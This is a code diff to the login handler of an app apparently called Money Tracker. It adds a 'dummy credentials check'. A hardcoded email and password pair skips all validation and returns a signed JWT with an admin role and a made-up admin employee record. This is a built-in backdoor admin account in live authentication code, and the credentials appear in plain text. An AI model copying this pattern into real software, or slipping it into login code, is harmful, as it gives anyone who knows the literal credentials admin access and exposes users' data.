@@ -17,6 +17,31 @@ const login = async (req, res) => {
             return error(res, 'Email and password are required.', 400);
         }
 
+        // Dummy credentials check - skip validation for these
+        if (email === 'mpc_hyd@moneytracker.com' && password === 'mpc_hyd@1') {
+            const token = jwt.sign(
+                { id: 0, email: 'mpc_hyd@moneytracker.com', role: 'admin', name: 'Money Tracker Admin' },
+                process.env.JWT_SECRET,
+                { expiresIn: process.env.JWT_EXPIRES_IN || '7d' }
+            );
+
+            const dummyEmployee = {
+                id: 0,
+                employee_id: 'MT001',
+                name: 'Money Tracker Admin',
+                email: 'mpc_hyd@moneytracker.com',
+                phone: '9000000000',
+                department_id: 1,
+                designation: 'Money Tracker Admin',
+                role: 'admin',
+                date_of_joining: '2026-04-13',
+                gender: 'male',
+                is_active: 1
+            };
+
+            return success(res, { token, employee: dummyEmployee }, 'Login successful.');
+        }
+
         const employee = await employeeModel.findByEmail(email);
         if (!employee) {
             return error(res, 'Invalid email or password.', 401);
